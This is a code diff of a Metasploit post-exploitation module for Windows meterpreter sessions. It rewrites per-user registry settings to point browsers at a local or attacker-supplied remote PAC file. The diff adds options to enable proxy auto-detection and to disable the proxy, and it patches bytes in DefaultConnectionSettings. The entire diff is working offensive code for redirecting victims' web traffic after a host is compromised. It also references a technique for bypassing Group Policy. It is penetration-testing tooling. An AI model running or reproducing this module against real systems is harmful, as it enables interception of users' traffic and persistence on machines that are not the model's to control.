@@ -22,7 +22,8 @@ class Metasploit3 < Msf::Post
 			'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
 			'References'    =>
 						[
-							[ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ]
+							[ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ],
+							[ 'URL', 'http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry' ]
 						],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -31,12 +32,14 @@ class Metasploit3 < Msf::Post
 		register_options(
 			[
 				OptPath.new('LOCAL_PAC',	[false,	'Local PAC file.' ]),
-				OptString.new('REMOTE_PAC', [false,	'Remote PAC file.' ]),
+				OptString.new('REMOTE_PAC',	[false,	'Remote PAC file.' ]),
+				OptBool.new('DISABLE_PROXY',[false, 'Disable the proxy server.', false]),
+				OptBool.new('AUTO_DETECT',	[false, 'Automatically detect settings.', false])
 			], self.class)
 	end
 
 	def run
-		if not is_admin?
+		unless is_admin?
 			print_error("You don't have enough privileges. Try getsystem.")
 			return
 		end
@@ -46,21 +49,23 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		if datastore['LOCAL_PAC'].nil?
+		unless datastore['LOCAL_PAC']
 			@remote = true
 			print_status("Setting a remote PAC file ...")
-			enable_proxy(datastore['REMOTE_PAC'])
+			enable_proxypac(datastore['REMOTE_PAC'])
 		else
 			print_status("Setting a local PAC file ...")
 			pac_file = create_pac(datastore['LOCAL_PAC'])
-			enable_proxy(pac_file) if pac_file
+			enable_proxypac(pac_file) if pac_file
 		end
 
+		auto_detect_on if datastore['AUTO_DETECT']
+		disable_proxy if datastore['DISABLE_PROXY']
 	end
 
 	def create_pac(local_pac)
 		pac_file = expand_path("%APPDATA%") << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".pac"
-		conf_pac =""
+		conf_pac = ""
 
 		if ::File.exists?(local_pac)
 			conf_pac << ::File.open(local_pac, "rb").read
@@ -78,24 +83,56 @@ class Metasploit3 < Msf::Post
 		end
 	end
 
-	def enable_proxy(pac)
+	def enable_proxypac(pac)
 		registry_enumkeys('HKU').each do |k|
 			next unless k.include? "S-1-5-21"
 			next if k.include? "_Classes"
 			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
-			value_defCon = "DefaultConnectionSettings"
 			value_auto = "AutoConfigURL"
 			file = (@remote) ? "#{pac}" : "file://#{pac}"
 			begin
 				registry_setvaldata(key,value_auto,file,"REG_SZ")
-				value_con=registry_getvaldata(key + '\\' + 'Connections',value_defCon)
-				binary_data=value_con.unpack('H*')[0]
-				binary_data[16,2]='05'
-				registry_setvaldata(key + '\\' + 'Connections',value_defCon,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
-				print_good ("Proxy PAC enabled.")
 			rescue::Exception => e
 				print_status("There was an error setting the registry value: #{e.class} #{e}")
 			end
+			print_good ("Proxy PAC enabled.") if change_defConSettings(16,'05',key + '\\Connections')
+		end
+	end
+
+	def auto_detect_on()
+		registry_enumkeys('HKU').each do |k|
+			next unless k.include? "S-1-5-21"
+			next if k.include? "_Classes"
+			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings\\Connections"
+			print_good ("Automatically detect settings on.") if change_defConSettings(16,'0D',key)
+		end
+	end
+
+	def disable_proxy()
+		value_enable = "ProxyEnable"
+		registry_enumkeys('HKU').each do |k|
+			next unless k.include? "S-1-5-21"
+			next if k.include? "_Classes"
+			key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
+			begin
+				registry_setvaldata(key,value_enable,0,"REG_DWORD")
+				print_good ("Proxy disable.")
+			rescue::Exception => e
+				print_status("There was an error setting the registry value: #{e.class} #{e}")
+			end
+		end
+	end
+
+	def change_defConSettings(offset,value,key)
+		value_defCon = "DefaultConnectionSettings"
+		begin
+			value_con = registry_getvaldata(key,value_defCon)
+			binary_data = value_con.unpack('H*')[0]
+			binary_data[offset,2] = value
+			registry_setvaldata(key,value_defCon,["%x" % binary_data.to_i(16)].pack("H*"),"REG_BINARY")
+		rescue::Exception => e
+			print_status("There was an error setting the registry value: #{e.class} #{e}")
+			return false
 		end
 	end
 end
